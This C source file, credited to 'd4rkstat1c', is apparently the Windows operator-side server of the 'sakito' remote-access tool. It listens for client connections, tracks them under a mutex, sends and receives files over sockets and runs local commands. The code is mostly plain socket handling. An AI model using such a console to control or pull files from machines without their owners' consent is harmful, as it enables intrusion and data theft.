/* 
Coded by d4rkstat1c.
Use educationally/legally.
*/
#define WINDOWS 1
#define INVALID_FILE INVALID_HANDLE_VALUE
#define READ 1
#define WRITE 0

typedef HANDLE s_file;

typedef struct {
	// Client hostname.
	char* host;

	// Client socket.
	SOCKET sock;

} Conn;

typedef struct {
	// Mutex object for race condition checks.
	HANDLE ghMutex;

	// Server buffer.
	char buf[BUFLEN + 1];

	// Thread handle for handling execution/termination of accept_conns thread.
	HANDLE acp_thread;

	// Server socket for accepting connections.
	SOCKET listen_socket;

	// Array of Conn objects/structures.
	Conn* clients;

	// Memory blocks allocated.
	size_t clients_alloc;

	// Amount of memory used.
	size_t clients_sz;

} Server_map;

void bind_socket(const SOCKET listen_socket);
void sakito_accept_conns(Server_map *s_map);
void resize_conns(Server_map *s_map, int client_id);

void get_cwd(char* const buf) {
	GetCurrentDirectory(BUFLEN, buf);
}

// Function to close specified socket.
void terminate_server(SOCKET socket, const char* const error) {
	int err_code = EXIT_SUCCESS;
	if (error) {
		fprintf(stderr, "%s: %ld\n", error, WSAGetLastError());
		err_code = 1;
	}

	closesocket(socket);
	WSACleanup();
	exit(err_code);
}

// Wrapper for TCP sending/receiving.
int sakito_tcp_send(SOCKET socket, const char* buf, const size_t count) {
	return send(socket, buf, count, 0);
}

int sakito_tcp_recv(SOCKET socket, char* const buf, const size_t count) {
	return recv(socket, buf, count, 0);
}

int write_stdout(const char* buf, size_t count) {
	HANDLE std_out = GetStdHandle(STD_OUTPUT_HANDLE);
	if (!WriteFile(std_out, buf, count, NULL, NULL))
		return FAILURE;

	return SUCCESS;
}

// Function to create socket.
const SOCKET create_socket() {
	// Initialize winsock.
	WSADATA wsData;
	WORD ver = MAKEWORD(2, 2);
	int wsResult = WSAStartup(ver, &wsData);

	// Create the server socket object.
	const SOCKET listen_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (listen_socket == INVALID_SOCKET) {
		fprintf(stderr, "Socket creation failed: %ld\n", WSAGetLastError());
		WSACleanup();
		exit(1);
	}

	int optval = 1;
	if (setsockopt(listen_socket, SOL_SOCKET, SO_REUSEADDR, (const char*)&optval, sizeof(optval)) != 0)
		terminate_server(listen_socket, "Error setting socket options");

	return listen_socket;
}


void mutex_lock(Server_map* s_map) {
	// If delete_client() is executing: wait for it to finish modifying s_map->clients to prevent race conditions from occurring.
	WaitForSingleObject(s_map->ghMutex, INFINITE);
}


void mutex_unlock(Server_map* s_map) {
	// Release our mutex now.
	ReleaseMutex(s_map->ghMutex);
}

s_file sakito_open_file(const char *filename, int rw_flag) {
	if (rw_flag == WRITE)
		return sakito_win_openf(filename, GENERIC_WRITE, CREATE_ALWAYS);
	else if (rw_flag == READ)
		return sakito_win_openf(filename, GENERIC_READ, OPEN_EXISTING);
	else
		return INVALID_FILE;
}

int sakito_close_file(s_file file) {
	return CloseHandle(file);
}

int sakito_send_file(SOCKET socket, s_file file, char* const buf, int32_t f_size) {
	return sakito_win_sendf(file, socket, buf, f_size);
}

int sakito_recv_file(SOCKET socket, s_file file, char* const buf, int32_t f_size) {
	return sakito_win_recvf(file, socket, buf, f_size);
}

int32_t sakito_file_size(s_file file) {
	// Get file size and serialize file size bytes.
	LARGE_INTEGER largeint_struct;
	GetFileSizeEx(file, &largeint_struct);
	return (int32_t)largeint_struct.QuadPart;
}

void exec_cmd(Server_map* s_map) {
	sakito_win_cp(NULL, s_map->buf);
	fputc('\n', stdout);
}

void terminate_console(Server_map* s_map) {
	// Quit accepting connections.
	TerminateThread(s_map->acp_thread, 0);

	// if there's any connections close them before exiting.
	if (s_map->clients_sz) {
		for (size_t i = 0; i < s_map->clients_sz; i++)
			closesocket(s_map->clients[i].sock);
		// Free allocated memory.
		free(s_map->clients);
	}

	// Stop accepting connections.
	terminate_server(s_map->listen_socket, NULL);
}

// Thread to recursively accept connections.
DWORD WINAPI accept_conns(LPVOID* lp_param) {
	// Call sakito wrapper function to accept incoming connections.
	Server_map* s_map = (Server_map*)lp_param;

	// Create our socket object.
	s_map->listen_socket = create_socket();

	// Bind socket to port.
	bind_socket(s_map->listen_socket);

	// Call wrapper function to accept incoming connections.
	sakito_accept_conns(s_map);

	return FAILURE;
}

void sakito_init(Server_map* s_map) {
	// Mutex lock for preventing race conditions.
	s_map->ghMutex = CreateMutex(NULL, FALSE, NULL);

	// Begin accepting connections.
	s_map->acp_thread = CreateThread(0, 0, accept_conns, s_map, 0, 0);
}
